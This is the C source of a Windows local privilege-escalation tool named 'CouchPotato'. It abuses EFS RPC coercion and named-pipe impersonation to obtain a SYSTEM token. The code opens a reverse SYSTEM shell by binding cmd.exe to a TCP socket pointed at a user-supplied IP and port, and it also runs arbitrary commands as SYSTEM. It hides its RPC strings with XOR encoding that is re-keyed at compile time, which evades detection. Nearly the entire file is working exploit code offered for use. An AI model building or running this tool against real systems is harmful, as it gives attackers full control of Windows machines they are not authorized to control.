#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <rpc.h>
#include <stdio.h>
#include <stdlib.h>
#include "couch_efsr_h.h"
#include "util.h"
#include <winsock2.h>

void* __RPC_USER MIDL_user_allocate(size_t n) {
    return HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, n);
}
void __RPC_USER MIDL_user_free(void* p) {
    if (p) HeapFree(GetProcessHeap(), 0, p);
}
void __RPC_USER PEXIMPORT_CONTEXT_HANDLE_rundown(
    PEXIMPORT_CONTEXT_HANDLE ctx) {
    (void)ctx;
}

static handle_t couch_bind(void) {
    RPC_STATUS st;
    RPC_WSTR sb = NULL;
    handle_t bh = NULL;

    // key changes every compile — derived from build timestamp
    const unsigned char _k = (unsigned char)(
        ((unsigned char)__TIME__[0] ^
            (unsigned char)__TIME__[3] ^
            (unsigned char)__TIME__[6]) | 1);

    // all wide strings XOR'd at compile time — no plaintext in .rdata
    // hardcoded length loops — null check fails when XOR'd zero is non-zero
    unsigned short _uuid[] = {
        L'd' ^ _k,L'f' ^ _k,L'1' ^ _k,L'9' ^ _k,L'4' ^ _k,L'1' ^ _k,L'c' ^ _k,L'5' ^ _k,
        L'-' ^ _k,L'f' ^ _k,L'e' ^ _k,L'8' ^ _k,L'9' ^ _k,L'-' ^ _k,L'4' ^ _k,L'e' ^ _k,
        L'7' ^ _k,L'9' ^ _k,L'-' ^ _k,L'b' ^ _k,L'f' ^ _k,L'1' ^ _k,L'0' ^ _k,L'-' ^ _k,
        L'4' ^ _k,L'6' ^ _k,L'3' ^ _k,L'6' ^ _k,L'5' ^ _k,L'7' ^ _k,L'a' ^ _k,L'c' ^ _k,
        L'f' ^ _k,L'4' ^ _k,L'4' ^ _k,L'd' ^ _k, 0
    };
    unsigned short _proto[] = {
        L'n' ^ _k,L'c' ^ _k,L'a' ^ _k,L'c' ^ _k,
        L'n' ^ _k,L'_' ^ _k,L'n' ^ _k,L'p' ^ _k, 0
    };
    unsigned short _host2[] = {
        L'\\' ^ _k,L'\\' ^ _k,L'l' ^ _k,L'o' ^ _k,L'c' ^ _k,
        L'a' ^ _k,L'l' ^ _k,L'h' ^ _k,L'o' ^ _k,L's' ^ _k,L't' ^ _k, 0
    };
    unsigned short _pipe[] = {
        L'\\' ^ _k,L'p' ^ _k,L'i' ^ _k,L'p' ^ _k,L'e' ^ _k,L'\\' ^ _k,
        L'e' ^ _k,L'f' ^ _k,L's' ^ _k,L'r' ^ _k,L'p' ^ _k,L'c' ^ _k, 0
    };
    unsigned short _host[] = {
        L'l' ^ _k,L'o' ^ _k,L'c' ^ _k,L'a' ^ _k,L'l' ^ _k,
        L'h' ^ _k,L'o' ^ _k,L's' ^ _k,L't' ^ _k, 0
    };

    // decrypt using hardcoded lengths — no null-terminator dependency
    for (int i = 0; i < 36; i++) _uuid[i] ^= _k;
    for (int i = 0; i < 8; i++) _proto[i] ^= _k;
    for (int i = 0; i < 11; i++) _host2[i] ^= _k;
    for (int i = 0; i < 12; i++) _pipe[i] ^= _k;
    for (int i = 0; i < 9; i++) _host[i] ^= _k;

    st = RpcStringBindingComposeW(
        (RPC_WSTR)_uuid,
        (RPC_WSTR)_proto,
        (RPC_WSTR)_host2,
        (RPC_WSTR)_pipe,
        NULL, &sb);
    if (st) { printf("[-] Compose: %ld\n", st); return NULL; }

    st = RpcBindingFromStringBindingW(sb, &bh);
    RpcStringFreeW(&sb);
    if (st) { printf("[-] FromString: %ld\n", st); return NULL; }

    st = RpcBindingSetAuthInfoW(bh,
        (RPC_WSTR)_host,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_AUTHN_GSS_NEGOTIATE,
        NULL, RPC_C_AUTHZ_NONE);
    if (st) { printf("[-] AuthInfo: %ld\n", st); RpcBindingFree(&bh); return NULL; }

    RpcBindingSetOption(bh, 12, 10000);
    return bh;
}

DWORD WINAPI efs_trigger(LPVOID param) {
    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCM) {
        SC_HANDLE hSvc = OpenServiceA(hSCM, "EFS", SERVICE_START | SERVICE_QUERY_STATUS);
        if (hSvc) {
            StartServiceA(hSvc, 0, NULL);
            Sleep(1000);
            CloseServiceHandle(hSvc);
        }
        CloseServiceHandle(hSCM);
    }

    handle_t ht = couch_bind();
    if (!ht) return 1;

    long* pUsers = NULL;
    RpcTryExcept {
        long result = EfsRpcQueryUsersOnFile(
            ht,
            L"\\\\localhost/pipe/CouchPotato\\C$\\couch.txt",
            &pUsers
        );
        (void)result;
    }
        RpcExcept(EXCEPTION_EXECUTE_HANDLER) {
        DWORD code = RpcExceptionCode();
        (void)code;
    }
    RpcEndExcept

    RpcBindingFree(&ht);
    return 0;
}

VOID efs_escalate(char* ip, char* port) {
    HANDLE hpipe = CreateNamedPipeA(
        "\\\\.\\pipe\\CouchPotato\\pipe\\srvsvc",
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES, 512, 512, NMPWAIT_WAIT_FOREVER, NULL);
    if (!hpipe || hpipe == INVALID_HANDLE_VALUE) {
        printf("[-] CreateNamedPipe: %lu\n", GetLastError()); return;
    }

    HANDLE hThread = CreateThread(NULL, 0, efs_trigger, NULL, 0, NULL);
    if (!hThread) {
        printf("[-] CreateThread: %lu\n", GetLastError());
        CloseHandle(hpipe); return;
    }

    OVERLAPPED ov = { 0 };
    ov.hEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
    ConnectNamedPipe(hpipe, &ov);

    DWORD w = WaitForSingleObject(ov.hEvent, 15000);
    WaitForSingleObject(hThread, 3000);
    CloseHandle(hThread);
    CloseHandle(ov.hEvent);

    if (w == WAIT_TIMEOUT) {
        printf("[-] Coercion failed\n");
        CloseHandle(hpipe); return;
    }
    printf("[+] LSASS connected\n");

    if (!ImpersonateNamedPipeClient(hpipe)) {
        printf("[-] ImpersonateNamedPipeClient: %lu\n", GetLastError());
        CloseHandle(hpipe); return;
    }
    printf("[+] Impersonating SYSTEM\n");

    HANDLE h_ex = NULL;
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &h_ex)) {
        printf("[-] OpenThreadToken: %lu\n", GetLastError());
        RevertToSelf(); CloseHandle(hpipe); return;
    }

    HANDLE h_new = NULL;
    if (!DuplicateTokenEx(h_ex, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &h_new)) {
        printf("[-] DuplicateTokenEx: %lu\n", GetLastError());
        CloseHandle(h_ex); RevertToSelf(); CloseHandle(hpipe); return;
    }
    printf("[+] SYSTEM token duplicated\n");

    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    SOCKET sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    struct sockaddr_in addr = { 0 };
    addr.sin_family = AF_INET;
    addr.sin_port = htons(atoi(port));
    addr.sin_addr.s_addr = inet_addr(ip);
    int rc = connect(sock, (struct sockaddr*)&addr, sizeof(addr));
    (void)rc;
    SetHandleInformation((HANDLE)sock, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);

    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION pi = { 0 };
    si.hStdInput = (HANDLE)sock;
    si.hStdOutput = (HANDLE)sock;
    si.hStdError = (HANDLE)sock;
    si.dwFlags = STARTF_USESTDHANDLES;

    if (!CreateProcessAsUserW(h_new,
        L"C:\\Windows\\System32\\cmd.exe",
        NULL, NULL, NULL,
        TRUE,
        0, NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcessAsUserW: %lu\n", GetLastError());
    }
    else {
        printf("[+] SYSTEM shell spawned\n");
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    CloseHandle(h_new);
    CloseHandle(h_ex);
    closesocket(sock);
    WSACleanup();
}

// ============================================================
// -exec <cmdline>: run a command as SYSTEM and stream stdout/stderr
// to the local console (no socket, no listener). For use as a
// post-exploit shell drop-in.
// ============================================================
static VOID cmd_exec(const char* cmdline) {
    HANDLE hpipe = CreateNamedPipeA(
        "\\\\.\\pipe\\CouchPotato\\pipe\\srvsvc",
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES, 512, 512, NMPWAIT_WAIT_FOREVER, NULL);
    if (!hpipe || hpipe == INVALID_HANDLE_VALUE) {
        printf("[-] CreateNamedPipe: %lu\n", GetLastError()); return;
    }

    HANDLE hThread = CreateThread(NULL, 0, efs_trigger, NULL, 0, NULL);
    if (!hThread) {
        printf("[-] CreateThread: %lu\n", GetLastError());
        CloseHandle(hpipe); return;
    }

    OVERLAPPED ov = { 0 };
    ov.hEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
    ConnectNamedPipe(hpipe, &ov);

    DWORD w = WaitForSingleObject(ov.hEvent, 15000);
    WaitForSingleObject(hThread, 3000);
    CloseHandle(hThread);
    CloseHandle(ov.hEvent);

    if (w == WAIT_TIMEOUT) {
        printf("[-] Coercion failed\n");
        CloseHandle(hpipe); return;
    }
    printf("[+] LSASS connected\n");

    if (!ImpersonateNamedPipeClient(hpipe)) {
        printf("[-] ImpersonateNamedPipeClient: %lu\n", GetLastError());
        CloseHandle(hpipe); return;
    }
    printf("[+] Impersonating SYSTEM\n");

    HANDLE h_ex = NULL;
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &h_ex)) {
        printf("[-] OpenThreadToken: %lu\n", GetLastError());
        RevertToSelf(); CloseHandle(hpipe); return;
    }

    HANDLE h_new = NULL;
    if (!DuplicateTokenEx(h_ex, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &h_new)) {
        printf("[-] DuplicateTokenEx: %lu\n", GetLastError());
        CloseHandle(h_ex); RevertToSelf(); CloseHandle(hpipe); return;
    }
    printf("[+] SYSTEM token duplicated\n");

    // create pipes for child stdout/stderr -> our console
    HANDLE hOutR = NULL, hOutW = NULL;
    HANDLE hErrR = NULL, hErrW = NULL;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    if (!CreatePipe(&hOutR, &hOutW, &sa, 0) ||
        !CreatePipe(&hErrR, &hErrW, &sa, 0)) {
        printf("[-] CreatePipe: %lu\n", GetLastError());
        CloseHandle(h_new); CloseHandle(h_ex); RevertToSelf(); CloseHandle(hpipe);
        return;
    }
    SetHandleInformation(hOutR, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(hErrR, HANDLE_FLAG_INHERIT, 0);

    // convert command line to wide string
    int wlen = MultiByteToWideChar(CP_ACP, 0, cmdline, -1, NULL, 0);
    WCHAR* wcmd = (WCHAR*)HeapAlloc(GetProcessHeap(), 0, wlen * sizeof(WCHAR));
    MultiByteToWideChar(CP_ACP, 0, cmdline, -1, wcmd, wlen);

    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    si.hStdOutput = hOutW;
    si.hStdError  = hErrW;
    si.dwFlags   = STARTF_USESTDHANDLES;
    PROCESS_INFORMATION pi = { 0 };

    if (!CreateProcessAsUserW(h_new, NULL, wcmd, NULL, NULL, TRUE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcessAsUserW: %lu\n", GetLastError());
    } else {
        CloseHandle(hOutW);
        CloseHandle(hErrW);

        // stream stdout
        char  buf[4096];
        DWORD got = 0;
        BOOL  childDone = FALSE;
        while (!childDone) {
            DWORD avail = 0;
            if (PeekNamedPipe(hOutR, NULL, 0, NULL, &avail, NULL) && avail) {
                if (ReadFile(hOutR, buf, sizeof(buf), &got, NULL) && got)
                    fwrite(buf, 1, got, stdout);
                continue;
            }
            if (PeekNamedPipe(hErrR, NULL, 0, NULL, &avail, NULL) && avail) {
                if (ReadFile(hErrR, buf, sizeof(buf), &got, NULL) && got)
                    fwrite(buf, 1, got, stderr);
                continue;
            }
            DWORD r = WaitForSingleObject(pi.hProcess, 50);
            if (r == WAIT_OBJECT_0) {
                // drain remaining
                while (ReadFile(hOutR, buf, sizeof(buf), &got, NULL) && got)
                    fwrite(buf, 1, got, stdout);
                while (ReadFile(hErrR, buf, sizeof(buf), &got, NULL) && got)
                    fwrite(buf, 1, got, stderr);
                childDone = TRUE;
            }
        }
        DWORD exitcode = 0;
        GetExitCodeProcess(pi.hProcess, &exitcode);
        printf("[+] exit=%lu\n", exitcode);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    HeapFree(GetProcessHeap(), 0, wcmd);
    CloseHandle(hOutR); CloseHandle(hOutW);
    CloseHandle(hErrR); CloseHandle(hErrW);
    CloseHandle(h_new);
    CloseHandle(h_ex);
    RevertToSelf();
    CloseHandle(hpipe);
}

static void usage(void) {
    printf(
        "Usage:\n"
        "  CouchPotato.exe <ip> <port>          reverse SYSTEM shell to <ip>:<port>\n"
        "  CouchPotato.exe -exec <cmdline>       run command as SYSTEM, write output to stdout\n");
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    LPSTR cmd = GetCommandLineA();
    BOOL q = FALSE; DWORD p = 0;
    while (cmd[p]) {
        if (cmd[p] == '"') q = !q;
        if (cmd[p] == ' ' && !q) break;
        p++;
    }
    while (cmd[p] == ' ') p++;
    char* a = cmd + p;

    if (_strnicmp(a, "-exec", 5) == 0 && (a[5] == ' ' || a[5] == '\0')) {
        a += 5;
        while (*a == ' ') a++;
        if (!*a) { usage(); return 1; }
        cmd_exec(a);
        return 0;
    }

    char* s = strchr(a, ' ');
    if (!a[0] || !s) { usage(); return 1; }

    char ip[16] = { 0 }, port[6] = { 0 };
    strncpy(ip, a, s - a);
    strcpy(port, s + 1);

    efs_escalate(ip, port);
    return 0;
}